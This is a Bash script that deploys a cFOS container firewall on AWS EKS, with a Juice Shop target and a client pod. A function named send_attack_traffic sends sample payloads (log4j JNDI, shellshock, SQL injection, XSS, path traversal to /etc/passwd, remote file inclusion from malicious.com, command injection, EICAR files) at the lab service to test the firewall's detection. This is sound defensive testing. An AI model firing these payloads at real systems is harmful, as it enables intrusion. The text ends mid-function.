#!/bin/bash  -e

function install_latest_aws_cli() {
  # 1. Check system architecture
if [ "$(uname -o)" = "Darwin" ]; then
    HOMEBREW_NO_AUTO_UPDATE=1 brew upgrade awscli || echo "Failed to upgrade awscli. Command: HOMEBREW_NO_AUTO_UPDATE=1 brew upgrade awscli"
fi


  architecture=$(uname -m)


  case "$architecture" in
    aarch64*)
      arch="arm64"
      ;;
    x86_64*)
      arch="x86_64"
      ;;
    *)
      echo "Unsupported architecture: $architecture"
      echo "This script only supports installDep on  aarch64 and x86_64 with a linux system."
      echo "for mac system, try install eksctl, awscli, helm etc on your own"
      echo "Detected architecture: $arch" on os is $(uname -o)
      return 1 # Indicate failure
      ;;
  esac

  echo "Detected architecture: $arch" on os is $(uname -o)

  # 2. Check if aws command exists and get its location
  aws_path=$(command -v aws) || echo check aws exist

  if [ -n "$aws_path" ]; then
    echo "Existing AWS CLI installation found at: $aws_path"
    read -p "Do you want to upgrade the existing AWS CLI installation in place? (y/n): " confirm_upgrade
    confirm_upgrade=$(echo "$confirm_upgrade" | tr '[:upper:]' '[:lower:]') # Make case-insensitive

    if [ "$confirm_upgrade" != "y" ]; then
      echo "Upgrade cancelled. Exiting."
      return 0 # Indicate script exited normally, no error
    fi
    install_dir=$(dirname "$aws_path") # Get the directory of existing aws command
    install_dir=$(dirname "$install_dir") # AWS CLI usually installed under /usr/local/bin/aws, so get /usr/local
    install_prefix="$install_dir"
    echo "Proceeding with upgrade in place at: $install_prefix"

  else
    echo "No existing AWS CLI installation found."
    default_install_prefix="/usr/local"
    install_prefix="$default_install_prefix"
    echo "Installing to default location: $install_prefix/aws-cli"
  fi

  # 3. Download and install latest AWS CLI
  temp_dir=$(mktemp -d)
  trap "rm -rf '$temp_dir'" EXIT # Cleanup temp dir on exit

  download_url="https://awscli.amazonaws.com/awscli-exe-linux-${arch}.zip"
  zip_file="$temp_dir/awscli-bundle.zip"

  echo "Downloading AWS CLI from: $download_url"
  if ! curl -s -L -o "$zip_file" "$download_url"; then
    echo "Error downloading AWS CLI. Please check your internet connection or the URL."
    return 1 # Indicate failure
  fi

  echo "Installing AWS CLI..."
  unzip -qq "$zip_file" -d "$temp_dir"

  if ! sudo "$temp_dir/aws/install" \
      --install-dir "$install_prefix/aws-cli" \
      --bin-dir "$install_prefix/bin" ; then
    echo "Error during AWS CLI installation."
    echo "Please check the error messages above or try running the install script manually from '$temp_dir/aws/'"
    return 1 # Indicate failure
  fi

  echo "AWS CLI installed successfully to $install_prefix/aws-cli and executable linked in $install_prefix/bin"
  echo "You may need to close and reopen your terminal or source your profile (e.g., 'source ~/.bashrc' or 'source ~/.zshrc') to ensure the 'aws' command is available in your PATH."
  return 0 # Indicate success
}

saveVariableForEdit() {
    local region="${1:-default}"  
    local output_file="config_${region}.sh"

    # Set all variables first using existing functions
#    if [ "$region" == "china" ]; then
#        set_china_aws_variable
#    else
#        set_global_aws_variable
#    fi

    # Create the configuration file
    {
        echo "#!/bin/bash"
        echo "# Configuration file for $region region"
        echo "# Generated on $(date)"
        echo "# This file can be edited and sourced back into the script"
        echo ""
        
        echo "# Common Variables"
        echo "# ----------------"
        echo "export EKSVERSION=\"$EKSVERSION\""
        echo "export CLUSTERNAME=\"$CLUSTERNAME\""
        echo "export ISPRIVATE=\"$ISPRIVATE\""
        echo "export DNS_IP=\"$DNS_IP\""
        echo "export SERVICEIPV4CIDR=\"$SERVICEIPV4CIDR\""
        echo "export DESIREDWORKERNODESIZE=\"$DESIREDWORKERNODESIZE\""
        echo "export CFOSLICENSEYAMLFILE=\"$CFOSLICENSEYAMLFILE\""
        echo "export ALTERNATIVEDOWNLOADURL=\"$ALTERNATIVEDOWNLOADURL\""
        echo "export CFOSHELMREPO=\"$CFOSHELMREPO\""
        echo "export DEMOCFOSFIREWALLPOLICY=\"$DEMOCFOSFIREWALLPOLICY\""
        echo "export DST_IP_TOCHECK=\"$DST_IP_TOCHECK\""
        echo "export DST_TCP_PORT_TOCHECK=\"$DST_TCP_PORT_TOCHECK\""
        
        echo ""
        echo "# Region-Specific Variables for $region"
        echo "# ----------------"
        echo "export AWS_PROFILE=\"$AWS_PROFILE\""
        echo "export AWS_REGION=\"$AWS_REGION\""
        echo "export EC2_SERVICE=\"$EC2_SERVICE\""
        echo "export IAM_PREFIX=\"$IAM_PREFIX\""
        
	echo "#helm Varible"
	echo "# -----------------"
	echo "export enableKeda=\"$enableKeda\""

        # Add MYIMAGEREPO only for China region
        if [ "$region" == "china" ]; then
            echo "export MYIMAGEREPO=\"$MYIMAGEREPO\""
        fi

        echo ""
        echo "# All variables are now exported"
        
    } > "$output_file"

    echo "Configuration saved to $output_file"
    echo "You can:"
    echo "1. Edit the file: vi $output_file"
    echo "2. Source it back: source $output_file"

    # Make the file executable
    chmod +x "$output_file"
}

get_env_or_default() {
    local env_var="$1"      # Environment variable name
    local default_val="$2"  # Default value
    local description="$3"  # Description for logging

    if [ ! -z "${!env_var}" ]; then
        echo >&2 "✅ Using $description from environment: ${!env_var}"
        printf "%s" "${!env_var}"
    else
        echo >&2 "Using default $env_var, $description: $default_val"
        printf "%s" "$default_val"
    fi
}

# Set common variables used by both regions

set_common_variables() {
    # Get values from environment or use defaults
    EKSVERSION=$(get_env_or_default \
        "EKSVERSION" \
        "1.31" \
        "EKS Version")

    CLUSTERNAME=$(get_env_or_default \
        "CLUSTERNAME" \
        "democluster" \
        "Cluster Name")

    ISPRIVATE=$(get_env_or_default \
        "ISPRIVATE" \
        "false" \
        "Is Private")

    DNS_IP=$(get_env_or_default \
        "DNS_IP" \
        "10.96.0.10" \
        "DNS IP")

    SERVICEIPV4CIDR=$(get_env_or_default \
        "SERVICEIPV4CIDR" \
        "10.96.0.0/16" \
        "Service IPv4 CIDR")

    export AWS_PAGER=""

    DESIREDWORKERNODESIZE=$(get_env_or_default \
        "DESIREDWORKERNODESIZE" \
        "1" \
        "Desired Worker Node Size")

    CFOSLICENSEYAMLFILE=$(get_env_or_default \
        "CFOSLICENSEYAMLFILE" \
        "cfos_license.yaml" \
        "CFOS License YAML File")

    ALTERNATIVEDOWNLOADURL=$(get_env_or_default \
        "CFOS_ALTERNATIVE_URL" \
	"https://cfos-helm-charts.s3.cn-north-1.amazonaws.com.cn" \
        "Alternative Download URL")

    CFOSHELMREPO=$(get_env_or_default \
        "CFOS_HELM_REPO" \
        "https://yagosys.github.io/cfos-chart" \
        "CFOS Helm Repo")

    DEMOCFOSFIREWALLPOLICY=$(get_env_or_default \
        "DEMOCFOSFIREWALLPOLICY" \
        "UTM" \
        "Demo CFOS Firewall Policy")

    DST_IP_TOCHECK=$(get_env_or_default \
        "DST_IP_TOCHECK" \
        "1.0.0.1" \
        "Destination IP to Check")

    DST_TCP_PORT_TOCHECK=$(get_env_or_default \
        "DST_TCP_PORT_TOCHECK" \
        "443" \
        "Destination TCP Port to Check")

    enableKeda=$(get_env_or_default \
	"enableKeda" \
	"true" \
	"enable Keda based scaling")
}

# Set AWS profile and region for aws china
set_china_aws_variable() {
    # Set common variables first
    set_common_variables

    # Set China-specific variables with environment variable support
    export AWS_PROFILE=$(get_env_or_default \
        "AWS_PROFILE" \
        "chinaaws" \
        "AWS Profile")

    AWS_REGION=$(get_env_or_default \
        "AWS_REGION" \
        "cn-north-1" \
        "AWS Region")

    EC2_SERVICE=$(get_env_or_default \
        "EC2_SERVICE" \
        "ec2.amazonaws.com.cn" \
        "EC2 Service Endpoint")

    IAM_PREFIX=$(get_env_or_default \
        "IAM_PREFIX" \
        "arn:aws-cn" \
        "IAM Prefix")

    MYIMAGEREPO=$(get_env_or_default \
        "MYIMAGEREPO" \
        "public.ecr.aws/t8s9q7q9" \
        "Image Repository")

    # Verify AWS profile
    if ! check_aws_profile "${AWS_PROFILE}"; then
        exit 1
    fi
}

# Set AWS profile and region for aws global
set_global_aws_variable() {
    # Set common variables first

    if ! command -v aws ; then
        install_latest_aws_cli
    fi

    set_common_variables

    # Set Global-specific variables with environment variable support
    export AWS_PROFILE=$(get_env_or_default \
        "AWS_PROFILE" \
        "default" \
        "AWS Profile")

    AWS_REGION=$(get_env_or_default \
        "AWS_REGION" \
        "us-east-1" \
        "AWS Region")

    EC2_SERVICE=$(get_env_or_default \
        "EC2_SERVICE" \
        "ec2.amazonaws.com" \
        "EC2 Service Endpoint")

    IAM_PREFIX=$(get_env_or_default \
        "IAM_PREFIX" \
        "arn:aws" \
        "IAM Prefix")

    # Verify AWS profile
    if ! check_aws_profile "$AWS_PROFILE"; then
        exit 1
    fi
}

function upgradeLatestEKSCTL () {
ARCH=$(uname -m)

# Check if the architecture is either amd64 or arm64
if [ "$ARCH" == "x86_64" ]; then
    ARCH="amd64"
elif [ "$ARCH" == "arm64" ]; then
    ARCH="arm64"
else
    echo "Unsupported architecture: $ARCH. Only amd64 and arm64 are supported."
    exit 1
fi
PLATFORM=$(uname -s)_$ARCH
echo $PLATFORM

# Check if eksctl is already installed and its location
if command -v eksctl &> /dev/null; then
    EXISITNG_EKSCTL_PATH=$(which eksctl)
    echo "eksctl is already installed at $EXISITNG_EKSCTL_PATH"
    # Optionally, you could remove the old version before upgrading
    #sudo rm $EXISITNG_EKSCTL_PATH
    #echo "Removing the old version of eksctl."
else
    echo "eksctl is not installed."
fi

# Download the latest version of eksctl
curl -sLO "https://github.com/eksctl-io/eksctl/releases/latest/download/eksctl_$PLATFORM.tar.gz"

# (Optional) Verify checksum
curl -sL "https://github.com/eksctl-io/eksctl/releases/latest/download/eksctl_checksums.txt" | grep $PLATFORM | sha256sum --check

# Extract the new version and clean up
tar -xzf eksctl_$PLATFORM.tar.gz -C /tmp && rm eksctl_$PLATFORM.tar.gz

# Move the new eksctl binary to the previous eksctl location or /usr/local/bin if not installed
if [ -n "$EXISITNG_EKSCTL_PATH" ]; then
    # Move new eksctl to the existing location
    sudo mv /tmp/eksctl $EXISITNG_EKSCTL_PATH
    echo "Replaced eksctl with the new version at $EXISITNG_EKSCTL_PATH"
else
    # If eksctl wasn't installed previously, move to /usr/local/bin
    sudo mv /tmp/eksctl /usr/local/bin
    echo "Installed eksctl to /usr/local/bin"
fi

# Verify installation
eksctl version
} 

check_prerequisites() {
    #local aws_profile="${1:-default}"  # Use provided profile or default
    local aws_profile=${AWS_PROFILE}
    local required_commands=("aws" "eksctl" "kubectl" "curl" "helm")
    local missing_commands=()

    echo "Checking prerequisites..."

    # Check for required commands
    for cmd in "${required_commands[@]}"; do
        if ! command -v "$cmd" &> /dev/null; then
		if test "${cmd}" == "eksctl" ; then 
			echo install latest version of eksctl
 			upgradeLatestEKSCTL && break
		fi 
            missing_commands+=("$cmd")
            echo "❌ $cmd is not installed"
        else
            echo "✅ $cmd is installed ($(command -v "$cmd"))"
            
            # Get version information for key tools
            case "$cmd" in
                "aws")
                    echo "   AWS CLI version: $(aws --version)"
                    ;;
                "kubectl")
                    echo "   Kubectl version: $(kubectl version --client --output=yaml | grep -m1 gitVersion)"
                    ;;
                "eksctl")
                    echo "   eksctl version: $(eksctl version)"
                    ;;
                "helm")
                    echo "   Helm version: $(helm version --short)"
                    ;;
            esac
        fi
    done

    # Check AWS profile using existing function
    echo -e "\nChecking AWS profile configuration..."
    if ! check_aws_profile "$aws_profile"; then
        missing_commands+=("aws_profile")
    fi

    # Note about kubectl config
    echo -e "\nNote: kubectl configuration will be created after EKS cluster deployment"

    # Note about helm repositories
    echo "Note: Helm repositories will be configured during deployment"

    # If any required commands are missing, exit with error
    if [ ${#missing_commands[@]} -ne 0 ]; then
        echo -e "\n❌ Prerequisites check failed. Missing components:"
        for cmd in "${missing_commands[@]}"; do
            echo "   - $cmd"
        done
        echo -e "\nPlease install missing components before proceeding."
        echo "Installation guides:"
        echo "AWS CLI: https://docs.aws.amazon.com/cli/latest/userguide/getting-started-install.html"
        echo "eksctl: https://eksctl.io/installation/"
        echo "kubectl: https://kubernetes.io/docs/tasks/tools/"
        echo "Helm: https://helm.sh/docs/intro/install/"
        return 1
    fi

    echo -e "\n✅ All prerequisites are satisfied"
    return 0
}

deploy_cfos_and_agent() {
    local region=$1

    echo ${DEMOCFOSFIREWALLPOLICY}

    # Deploy components in sequence
    deploykeda "$region" || {
        echo "❌ Failed to deploy KEDA"
        return 1
    }

    deploy_local_path_provisioner "$region" || {
        echo "❌ Failed to deploy local-path-provisioner"
        return 1
    }

#    applyCFOSLicense || {
#        echo "❌ Failed to apply CFOS license"
#        return 1
#    }

    deployCFOSandAgentChinaAWS "$region" || {
        echo "❌ Failed to deploy CFOS and Agent"
        return 1
    }

    echo "Successfully deployed CFOS and all components"
    return 0
}


check_network_connectivity() {
    local target_ip="${1:-1.0.0.1}"    # Default to 1.0.0.1 if not provided
    local target_port="${2:-443}"       # Default to 443 if not provided
    
    echo "Starting network connectivity check to ${target_ip}:${target_port}"
    
    pods=$(kubectl get pods -l protectedby=cfos -o jsonpath='{.items[*].metadata.name}')
    
    if [ -z "$pods" ]; then
        echo "❌ No pods found with label protectedby=cfos"
        return 1
    fi 

    for pod in $pods; do
        echo "Checking network connectivity in protected pod: $pod"
        if kubectl exec $pod -- /bin/sh -c "nc -v -z -w 3 ${target_ip} ${target_port}"; then
            echo "✅ Connection successful from pod ${pod} to ${target_ip}:${target_port}"
        else
            echo "❌ Connection failed from pod ${pod} to ${target_ip}:${target_port}"
        fi
    done

    echo "Network connectivity check completed for all pods to ${target_ip}:${target_port}"
}


check_aws_profile() {
    local profile="$1"
    
    echo "Checking AWS profile: $profile"
    
    # Check if profile exists in aws configure list-profiles
    if ! aws configure list-profiles | grep -q "^${profile}$"; then
        echo "Error: AWS profile '${profile}' not found"
        echo "Available profiles:"
        aws configure list-profiles
        echo "❌ Please configure the required AWS profile first using 'aws configure --profile ${profile}'"
        return 1
    fi

    # Verify profile can access AWS services
    if ! aws sts get-caller-identity --profile "$profile" >/dev/null 2>&1; then
        echo "❌ Error: Unable to access AWS with profile '${profile}'"
        echo "Please check your AWS credentials and permissions"
        return 1
    fi

    echo "✅ AWS profile '${profile}' verified successfully"
    return 0
}

function deploy_demo_pod() {
echo kubectl apply -f ${ALTERNATIVEDOWNLOADURL}/diag.yaml 
kubectl apply -f ${ALTERNATIVEDOWNLOADURL}/diag.yaml
kubectl rollout status deployment diag 
echo sleep 10 
sleep 10
check_network_connectivity ${DST_IP_TOCHECK} ${DST_TCP_PORT_TOCHECK}
create_and_apply_juiceshop_yaml
create_and_apply_diag2_yaml
}

function send_attack_traffic() {
test_diag2 "$@"
}

function test_diag2() {
    # Parameters from command line - now all 4 are expected from CLI, with defaults inside function
    label_selector_source_pod="${1:-app=diag2}"
    namespace_source_pod="${2:-backend}"
    target_svc_name="${3:-juiceshop-service}"
    target_svc_namespace="${4:-security}"
    payload_type="${5:-normal}"
    logfile_name="${6:-traffic.0}"

    # Define the Juice Shop service address in a variable using parameters
    local service_address="http://${target_svc_name}.${target_svc_namespace}.svc.cluster.local:3000/"
    local cfos_pod_name=$(kubectl get pods -l app=firewall -o jsonpath='{.items[?(@.status.phase=="Running")].metadata.name}')


   


    case "$payload_type" in
    normal)
        local payload='curl -s -I --max-time 5'
        local logfile_name="traffic.0"
        ;;
    log4j)
        local payload='curl -s -I --max-time 5 -H "User-Agent: \${jndi:ldap://example.com/a}"'
        local logfile_name="ips.0"
        ;;
    shellshock)
        local payload='curl -s -I --max-time 5 -H "User-Agent: () { :; }; /bin/ls"'
        local logfile_name="ips.0"
        ;;
    sql_injection)
        local payload='curl -s -I --max-time 5 --data "username=admin&password= OR 1=1 -- -"'
        local logfile_name="ips.0"
        ;;
    xss)
        local payload='curl -s -I --max-time 5 --data "search=<script>alert(1)</script>"'
        local logfile_name="ips.0"
        ;;
    lfi)
        local payload='curl -s -I --max-time 5 "http://target.com/index.php?page=../../../../etc/passwd"'
        local logfile_name="ips.0"
        ;;
    rfi)
        local payload='curl -s -I --max-time 5 "http://target.com/index.php?page=http://malicious.com/shell.txt"'
        local logfile_name="ips.0"
        ;;
    cmd_injection)
        local payload='curl -s -I --max-time 5 --data "input=1; cat /etc/passwd"'
        local logfile_name="ips.0"
        ;;
    directory_traversal)
        local payload='curl -s -I --max-time 5 "http://target.com/../../../../etc/passwd"'
        local logfile_name="ips.0"
        ;;
    user_agent_malware)
        local payload='curl -s -I --max-time 5 -H "User-Agent: BlackSun"'
        local logfile_name="ips.0"
        ;;
    eicardownload)
	local payload='curl -s -k -O https://secure.eicar.org/eicar.com.txt'
        local logfile_name="virus.0"
        ;;
    eicardownload1)
	local payload='curl -s -k -O https://secure.eicar.org/eicar_passwd.zip'
        local logfile_name="virus.0"
        ;;
    eicarupload)
        curl -k -O https://secure.eicar.org/eicar_com.zip 
	kubectl cp eicar_com.zip $(kubectl get pods -l app=diag2 -n backend -o jsonpath='{.items[0].metadata.name}'):/tmp/eicar_com.zip -n backend
        local payload='curl -v -F "file=@/tmp/eicar_com.zip"'
        local logfile_name="virus.0"
        ;;
    trojan)
        local payload='curl -s -I --max-time 5 --data "$(echo 'bWFsaWNpb3VzX2NvZGU9dHJvamFuX3NpZ25hdHVyZQ==' | base64 -d)"'
        local logfile_name="virus.0"
        ;;
    worm)
        local payload='curl -s -I --max-time 5 --data "$(echo 'bWFsaWNpb3VzX2NvZGU9d29ybV9zaWduYXR1cmU=' | base64 -d)"'
        local logfile_name="virus.0"
        ;;
     cve1)
        local payload='curl -X POST -H "Content-Type: application/json" \
  -d "{\"query\": \"hello; echo vulnerable > /tmp/proof.txt #\", \"response_mode\": \"compact\"}"'
        local logfile_name="ips.0"
        ;;
    *)
        local payload='curl -s -I --max-time 5'
        local logfile_name="ips.0"
        ;;
esac


    run_curl_in_pod "$payload" "$service_address"
    echo "kubectl exec -it po/${cfos_pod_name} -c cfos -- tail -n -1 /var/log/log/${logfile_name}"
    kubectl exec -it po/${cfos_pod_name} -c cfos -- tail -n -1 /var/log/log/${logfile_name}

}


run_curl_in_pod() {
    # Parameters
    LOCAL_CURL_COMMAND="$1"
    JUICE_SHOP_SVC="$2"

    # Using local variables to get label and namespace from test_diag2 scope
    local pod_label_selector="${label_selector_source_pod}"
    local pod_namespace="${namespace_source_pod}"

    # Get the pod name with the specified label selector and namespace
    POD_NAME=$(kubectl get pods -n "$pod_namespace" -l "$pod_label_selector" -o jsonpath='{.items[0].metadata.name}')

    if [ -z "$POD_NAME" ]; then
        echo "No pod found with label '$pod_label_selector' in namespace '$pod_namespace'"
        exit 1
    fi

    # Run the curl command inside the pod
    echo "kubectl exec -it $POD_NAME --namespace $pod_namespace -- bash -c \"$LOCAL_CURL_COMMAND $JUICE_SHOP_SVC\""
    echo "✅  waiting result"
    kubectl exec $POD_NAME --namespace "$pod_namespace" -- bash -c "$LOCAL_CURL_COMMAND $JUICE_SHOP_SVC"
    sleep 2
}

function create_and_apply_diag2_yaml() {
     YAML_FILE="diag2_deployment.yaml"
     local namespacename="backend"
     local appname="diag2"
     cat <<EOF > $YAML_FILE
apiVersion: v1
kind: Namespace
metadata:
  name: ${namespacename}

---
apiVersion: apps/v1
kind: Deployment
metadata:
  name: ${appname}
  namespace: ${namespacename}
spec:
  replicas: 1
  selector:
    matchLabels:
      app: ${appname}
  template:
    metadata:
      labels:
        app: ${appname}
        protectedby: cfos
    spec:
      containers:
        - name: praqma
          image: praqma/network-multitool
          ports:
            - containerPort: 80
          args:
            - /bin/sh
            - -c
            - /usr/sbin/nginx -g "daemon off;"
          securityContext:
            capabilities:
              add: ["NET_ADMIN","SYS_ADMIN","NET_RAW"]

---
apiVersion: v1
kind: Service
metadata:
  name: ${appname}-service
  namespace: ${namespacename}
spec:
  selector:
    app: ${appname}
  ports:
    - protocol: TCP
      port: 3000
      targetPort: 80

EOF

    # Apply the YAML file to Kubernetes
    kubectl apply -f $YAML_FILE

    # Wait for the deployment to be ready
    kubectl rollout status deployment/${appname} -n ${namespacename} --timeout=300s

    echo "diag2 deployment with clusterip svc  in namespace ${namespacename} is ready."
}

function create_and_apply_juiceshop_yaml() {
    # Define the YAML file path
    YAML_FILE="juiceshop_deployment.yaml"

    # Create the YAML content and save it to the file
    cat <<EOF > $YAML_FILE
apiVersion: v1
kind: Namespace
metadata:
  name: security

---
apiVersion: apps/v1
kind: Deployment
metadata:
  name: juiceshop
  namespace: security
spec:
  replicas: 1
  selector:
    matchLabels:
      app: juiceshop
  template:
    metadata:
      labels:
        app: juiceshop
    spec:
      containers:
        - name: juiceshop
          image: bkimminich/juice-shop:latest
          ports:
            - containerPort: 3000

---
apiVersion: v1
kind: Service
metadata:
  name: juiceshop-service
  namespace: security
spec:
  selector:
    app: juiceshop
  ports:
    - protocol: TCP
      port: 3000
      targetPort: 3000
EOF

    # Apply the YAML file to Kubernetes
    kubectl apply -f $YAML_FILE

    # Wait for the deployment to be ready
    kubectl rollout status deployment/juiceshop -n security --timeout=300s

    echo "JuiceShop deployment is ready."
}


deploykeda() {
    local region=$1

    # Set region first
#    if [ "$region" == "china" ]; then
#        set_china_aws_variable
#    else
#        set_global_aws_variable
#    fi

    # Check if cluster exists
    if ! check_eks_cluster; then
        echo "EKS cluster does not exist. Creating cluster with nodegroups first..."
        create_cluster_only || return 1
        create_nodegroups || return 1
        echo "Cluster creation completed. Proceeding with KEDA deployment..."
    fi

    # Check if KEDA is already deployed
    if kubectl get namespace keda >/dev/null 2>&1; then
        if kubectl get deployment keda-operator -n keda >/dev/null 2>&1; then
            echo "KEDA is already deployed and running"
            echo "To redeploy KEDA, please delete it first using: $0 deleteCFOSandAgent"
            return 0
        else
            echo "KEDA namespace exists but operator not found. Cleaning up..."
            kubectl delete namespace keda --timeout=60s
        fi
    fi

    # Deploy KEDA based on region
    if [ "$region" == "china" ]; then
        install_keda_with_yaml_ecr || return 1
        install_metrics_server_ecr
    else
        install_keda_with_helm || return 1
        install_metrics_server
    fi

    return 0
}

deleteCFOSandAgent() {
    echo "Starting deletion of CFOS and related components..."

    # Delete route-manager daemonset first to allow proper cleanup
    if kubectl get ds route-manager &>/dev/null; then
        echo "Deleting route-manager daemonset..."
        if ! kubectl delete ds route-manager; then
            echo "Warning: Failed to delete route-manager daemonset"
            # Continue with deletion process despite failure
        else
            echo "Successfully deleted route-manager daemonset"
            # Wait a bit for cleanup to complete
            #echo "Waiting for route-manager cleanup..."
            #sleep 10
        fi
    else
        echo "route-manager daemonset not found"
    fi

    # Delete CFOS helm release
    local helm_release=$(helm list | grep cfos7210250-deployment-new | awk '{print $1}')
    if [ ! -z "$helm_release" ]; then
        echo "Uninstalling CFOS helm release: $helm_release"
        helm uninstall "$helm_release"
    else
        echo "No CFOS helm release found"
    fi

    # Delete components if yaml exists
    local files=("components.yaml" "local-path-storage.yaml" "keda-2.12.1.yaml")
    
    for file in "${files[@]}"; do
        if [ -f "$file" ]; then
            echo "Deleting resources from $file..."
            if kubectl delete -f "$file" 2>/dev/null; then
                echo "Successfully deleted resources from $file"
                rm -f "$file"
            else
                echo "Warning: Some resources from $file might not exist or failed to delete"
            fi
        else
            echo "File $file not found, skipping..."
        fi
    done

    # Additional cleanup: Delete namespaces if they exist
    local namespaces=("keda" "local-path-storage" "backend" "security")
    
    for ns in "${namespaces[@]}"; do
        if kubectl get namespace "$ns" &>/dev/null; then
            echo "Deleting namespace $ns..."
            kubectl delete namespace "$ns" --timeout=60s
        else
            echo "Namespace $ns not found"
        fi
    done

    echo delete fos-license configmap 

    kubectl delete cm fos-license  || echo failed to delete cm fos-license

    echo delete webprofileerrorpass configmap 
    kubectl delete cm webprofileerrorpass || echo failed to delete cm webprofileerrorpass 

    echo "Cleanup completed"

    return 0
}

download_yaml() {
    local url="$1"
    local output_file="$2"
    
    echo "Downloading from ${url} to ${output_file}"
    
    # Check if both parameters are provided
    if [ -z "$url" ] || [ -z "$output_file" ]; then
        echo "Error: URL and output file must be specified"
        return 1
    fi 

    # Use curl with proper error handling
    if ! curl -sSL "${url}" --output "${output_file}"; then
        echo "Error: Failed to download from ${url}"
        return 1
    fi

    # Verify the file exists and contains YAML content
    if [ ! -f "${output_file}" ] || ! grep -q "apiVersion:" "${output_file}"; then
        echo "Error: Downloaded file does not appear to be valid YAML"
#        rm -f "${output_file}"
        return 1
    fi

    echo "✅ Successfully downloaded YAML file"
    return 0
}

deploy_local_path_provisioner() {
    local region=$1
    local yaml_file="local-path-storage.yaml"
    local primary_url="https://raw.githubusercontent.com/rancher/local-path-provisioner/v0.0.26/deploy"
    

    # Check if local-path-provisioner is already deployed and running
    if kubectl get deployment local-path-provisioner -n local-path-storage >/dev/null 2>&1; then
        echo "Local-path-provisioner is already deployed and running"
        echo "To redeploy, please delete it first using: kubectl delete -n local-path-storage deployment local-path-provisioner"
        return 0
    fi


    echo "Deploying local-path-provisioner..."

    # Try primary download URL first
      if ! download_yaml "${primary_url}/${yaml_file}" "${yaml_file}"; then
        echo "Primary download failed, trying alternative China region URL..."
        
        # Try alternative China region URL if primary fails
      if ! download_yaml "${ALTERNATIVEDOWNLOADURL}/${yaml_file}" "${yaml_file}"; then

            echo "❌ Error: Failed to download local-path-provisioner YAML from both sources"
            return 1
        fi
        echo "✅ Successfully downloaded local-path-provisioner YAML from alternative source"
    else
        echo "✅ Successfully downloaded local-path-provisioner YAML from primary source"
    fi

    # For China region, replace image repository if needed
     if [ "$region" == "china" ]; then
    echo "Updating image repository for ${region} region..."
    if [[ "$OSTYPE" == "darwin"* ]]; then
        echo "macOS version"
        # Replace rancher/local-path-provisioner image
        sed -i '' "s|image: rancher/local-path-provisioner:|image: ${MYIMAGEREPO}/local-path-provisioner:|g" "${yaml_file}"
        # Replace busybox image
        sed -i '' "s|image: busybox|image: ${MYIMAGEREPO}/busybox:latest|g" "${yaml_file}"
    else
        echo "Linux version"
        # Replace rancher/local-path-provisioner image
        sed -i "s|image: rancher/local-path-provisioner:|image: ${MYIMAGEREPO}/local-path-provisioner:|g" "${yaml_file}"
        # Replace busybox image
        sed -i "s|image: busybox|image: ${MYIMAGEREPO}/busybox|g" "${yaml_file}"
    fi
   fi 

    # Apply the configuration
    echo "Applying local-path-provisioner configuration..."
    if ! kubectl apply -f "${yaml_file}"; then
        echo "Error: Failed to apply local-path-provisioner configuration"
        rm -f "${yaml_file}"
        return 1
    fi

    # Clean up the downloaded file
    #rm -f "${yaml_file}"

    # Wait for deployment to be ready
    echo "Waiting for local-path-provisioner deployment to be ready..."
    if ! kubectl rollout status deployment local-path-provisioner -n local-path-storage --timeout=300s; then
        echo "Error: local-path-provisioner deployment failed to become ready"
        return 1
    fi

    echo "✅ Local-path-provisioner deployment completed successfully"
    return 0
}

create_license_configmap() {
    local input_file=$1
    local output_file="cfos_license.yaml"

    if [ -f "$output_file" ]; then
       echo "Error: cfos_license.yaml file already exist"
       return 1
    fi 

    # Check if input file parameter is provided
    if [ -z "$input_file" ]; then
        echo "❌ Error: No input file specified"
        echo "Usage: createCFOSLicenseConfigmap <input_file>"
        return 1
    fi

    # Check if the input file exists
    if [ ! -f "$input_file" ]; then
	echo "❌  License file does not exist - $input_file"
        return 1
    fi

    # Read the file and prepend six spaces to each line
    local license_data
    license_data=$(sed 's/^/      /' "$input_file") || {
        echo "❌ Error: Failed to process license data"
        return 1
    }

    # Create the ConfigMap YAML file with modified license data
    cat <<EOF >"$output_file"
apiVersion: v1
kind: ConfigMap
metadata:
    name: fos-license
    labels:
        app: fos
        category: license
data:
    license: |+
$license_data
EOF

    # Check if the output file was created successfully
    if [ -f "$output_file" ]; then
        echo "Successfully created $output_file"
        return 0
    else
        echo "❌ Error: Failed to create $output_file"
        return 1
    fi
}

# Check if license file exists and has valid format
check_license_file() {
    # Check if variable is set
    if [ -z "$CFOSLICENSEYAMLFILE" ]; then
        echo "❌ CFOSLICENSEYAMLFILE variable is not set."
        return 1
    fi 

    # Check if file exists
    if [ ! -f "$CFOSLICENSEYAMLFILE" ]; then
        echo "❌ License file ${CFOSLICENSEYAMLFILE} does not exist."
        echo "get your cFOS license and use $0 createCFOSLicenseConfigmap <CFOSVLTMXXXX.lic to create licenseconfigmap yaml file"
        return 1
    fi 

    # Check if file is readable
    if [ ! -r "$CFOSLICENSEYAMLFILE" ]; then
        echo "❌ License file ${CFOSLICENSEYAMLFILE} is not readable."
        return 1
    fi 

    # Check basic YAML structure without kubectl
    if ! grep -q "^apiVersion: v1" "$CFOSLICENSEYAMLFILE"; then
        echo "❌ License file must have 'apiVersion: v1'."
        return 1
    fi 

    if ! grep -q "^kind: ConfigMap" "$CFOSLICENSEYAMLFILE"; then
        echo "❌ License file must be a ConfigMap."
        return 1
    fi 

    if ! grep -q "^metadata:" "$CFOSLICENSEYAMLFILE"; then
        echo "❌ License file must have metadata section."
        return 1
    fi 

    # Check for required labels
    if ! grep -q "app: fos" "$CFOSLICENSEYAMLFILE"; then
        echo "❌ License ConfigMap must have label 'app: fos'."
        return 1
    fi 

    # Check for license data section
    if ! grep -q "license: |" "$CFOSLICENSEYAMLFILE"; then
        echo "❌ License ConfigMap must contain 'license:' data field."
        return 1
    fi 

    # Check for CFOS LICENSE header
    if ! grep -q "BEGIN CFOS LICENSE" "$CFOSLICENSEYAMLFILE"; then
        echo "❌ License file does not contain valid CFOS license format."
        return 1
    fi 

    echo "✅ License file validation passed."
    return 0
}

# Apply the license ConfigMap
apply_license() {
    echo "Applying CFOS license ConfigMap..."
    if ! kubectl apply -f "$CFOSLICENSEYAMLFILE"; then
        echo "❌ Failed to apply CFOS license ConfigMap."
        return 1
    fi

    # Verify the ConfigMap was created
    if ! kubectl get configmap fos-license >/dev/null 2>&1; then
        echo "❌ Failed to verify CFOS license ConfigMap creation."
        return 1
    fi

    echo "✅ CFOS license ConfigMap applied successfully."
    return 0
}

# Main license application function
applyCFOSLicense() {
    echo "Processing CFOS license..."

    # Apply license
    if ! apply_license; then
        echo "❌ License application failed."
        exit 1
